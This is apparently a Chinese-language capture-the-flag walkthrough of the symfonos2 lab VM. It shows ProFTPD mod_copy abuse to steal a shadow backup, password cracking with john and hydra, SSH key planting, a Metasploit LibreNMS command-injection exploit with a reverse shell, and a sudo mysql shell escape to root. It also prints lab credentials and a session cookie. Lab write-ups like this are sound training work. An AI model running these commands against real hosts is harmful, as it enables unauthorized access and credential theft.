# symfonos2

![image-20200622214334864](assets/symfonos2.assets/image-20200622214334864.png)

![image-20200622214517388](assets/symfonos2.assets/image-20200622214517388.png)

```bash
enum4linux -a 192.168.43.83
```

![image-20200622214839554](assets/symfonos2.assets/image-20200622214839554.png)

```bash
smbclient --no-pass //192.168.43.83/anonymous
```

免密连接一下

![image-20200622215016343](assets/symfonos2.assets/image-20200622215016343.png)

查看下载好的log.txt

![image-20200623041203737](assets/symfonos2.assets/image-20200623041203737.png)

得到用户名aeolus。

![image-20200622215855649](assets/symfonos2.assets/image-20200622215855649.png)

ftp 是ProFTPD 1.3.5，是存在漏洞的，但是使用ftp命令是无法匿名登录的，我们尝试使用telnet

![image-20200623041747356](assets/symfonos2.assets/image-20200623041747356.png)

成功匿名登录。利用ProFTPD 1.3.5已知漏洞将在log.txt中发现的被备份出来的shadow文件，复制到我们可以进行下载的smb目录

```bash
SITE CPFR /var/backups/shadow.bak
SITE CPTO /home/aeolus/share/shadow.bak
```

![image-20200623042122076](assets/symfonos2.assets/image-20200623042122076.png)

这时再次免密登录smb，即可看到我们复制过去的shadow.bak

![image-20200623042217585](assets/symfonos2.assets/image-20200623042217585.png)

下载到本地

![image-20200623042254178](assets/symfonos2.assets/image-20200623042254178.png)

查看

![image-20200623073046951](assets/symfonos2.assets/image-20200623073046951.png)

可以看到我们有root及两个额外的用户，拷贝副本，并编辑去掉无用的用户，以及由于是靶机所以我们不可能跑出来的root

![image-20200623074954130](assets/symfonos2.assets/image-20200623074954130.png)

送入john进行破解

![image-20200623075503172](assets/symfonos2.assets/image-20200623075503172.png)

第二种方法，这种要慢于本机使用john

可以尝试hydra破解aeolus的凭证

```bash
sudo hydra -l aeolus -P /usr/share/wordlists/rockyou.txt ssh://192.168.43.83 -t 4 -vV
```


![image-20200623022032522](assets/symfonos2.assets/image-20200623022032522.png)

```bash
aeolus:sergioteamo
```

尝试登录ssh，发现ssh需要公钥。

![image-20200623025021683](assets/symfonos2.assets/image-20200623025021683.png)

登录ftp，密码是复用的。

![image-20200623025106475](assets/symfonos2.assets/image-20200623025106475.png)

查看了一下没有其他东西，文件内容和smb是一个。

首先伪造一套ssh密钥

![image-20200623033042558](assets/symfonos2.assets/image-20200623033042558.png)

我们之前在log.txt中发现smb所进入的目录其真实路径为/home/aeolus/share，而由于其中内容backups与ftp内容一样，可以初步判断这是同一个文件夹。这样可以通过在ftp上传文件后，smb可以同步看到进行确认。



![image-20200623033736172](assets/symfonos2.assets/image-20200623033736172.png)

登录ftp

![image-20200623040219885](assets/symfonos2.assets/image-20200623040219885.png)

此时我们处于的目录应该是/home/aeolus，由于我们是使用aeolus用户登录的，故而，我们对这个目录具有可写权限。

新建.ssh目录，可以通过回显看到我们确实是在正确的目录中。上传我们伪造的ssh公钥。

![image-20200623040425082](assets/symfonos2.assets/image-20200623040425082.png)

此时再次登录ssh并使用我们刚才的id_rsa密钥文件，即可登录ssh

```bash
ssh -i id_rsa aeolus@192.168.43.83
```

![image-20200623040710594](assets/symfonos2.assets/image-20200623040710594.png)



上传linpeas和LinEnum到tmp文件夹做一些基础的枚举

![image-20200623080610926](assets/symfonos2.assets/image-20200623080610926.png)

![image-20200623081749087](assets/symfonos2.assets/image-20200623081749087.png)

在LinEnum的枚举结果中我们注意到用户cronus有运行apache

![image-20200623081917100](assets/symfonos2.assets/image-20200623081917100.png)

并且监听了8080

![image-20200623082006941](assets/symfonos2.assets/image-20200623082006941.png)

来查看一下，目标可以使用curl，用curl查看一下

![image-20200623082505288](assets/symfonos2.assets/image-20200623082505288.png)

确实有一个服务，并且应该是一个登录界面

![image-20200623082605130](assets/symfonos2.assets/image-20200623082605130.png)

我们现在将做一个端口转发，将内部的8080转发到外部，以方便我们进行下一步测试。

```bash
ssh -L 8080:localhost:8080 aeolus@192.168.1.124
```

![image-20200623083648300](assets/symfonos2.assets/image-20200623083648300.png)

这是在kali端浏览本地8080端口，就是目标机器的8080端口。

![image-20200623083631386](assets/symfonos2.assets/image-20200623083631386.png)

libreNMS

![image-20200623090233385](assets/symfonos2.assets/image-20200623090233385.png)

![image-20200623090252729](assets/symfonos2.assets/image-20200623090252729.png)

需要cookie，仔细看看标题是已认证登录之后才能执行远程命令执行。

尝试密码复用，成功

![image-20200623100429737](assets/symfonos2.assets/image-20200623100429737.png)

复制cookie，使用cookie quick manager插件

![image-20200623100545573](assets/symfonos2.assets/image-20200623100545573.png)

前两个都是登录之前的从cookie值，librenms_session则是登录后的cookie值

```bash
librenms_session=eyJpdiI6IlFzMlpSVXRsRkZLM3JwbWgxT0VyZ3c9PSIsInZhbHVlIjoidkl2Tkw2Z0RRaGZrVEQwVENXZkdldXd2cmVNcTVHS3kzQngrdEpjdlI4aVh0OUZ3YkdmeDBHSmt4THFQZXpiTjIxWXZlNldTTXBoa2Vjeit1Zzg4WUE9PSIsIm1hYyI6Ijc0NTUzOTdlMDNmMDhlZmY4ZGVjNzM0Y2M2MGM1OGNmNzhiYmFmYzA3NGVlNWFkMjM2MWZkYTRkM2U4ZDYwNjIifQ%3D%3D
```

构建漏洞利用执行语句
尝试手动利用失败，无法得到shell

利用msf

![image-20200623114419788](assets/symfonos2.assets/image-20200623114419788.png)


```bash
search libre
use exploit/linux/http/librenms_addhost_cmd_inject
set rhosts 127.0.0.1
set rport 8080
set lhost 192.168.1.108
set username aeolus
set password sergioteamo
exploit
```

![image-20200623115903113](assets/symfonos2.assets/image-20200623115903113.png)

![image-20200623120205619](assets/symfonos2.assets/image-20200623120205619.png)

```bash
sudo /usr/bin/mysql -e '\! /bin/sh'
```

![image-20200623120333783](assets/symfonos2.assets/image-20200623120333783.png)

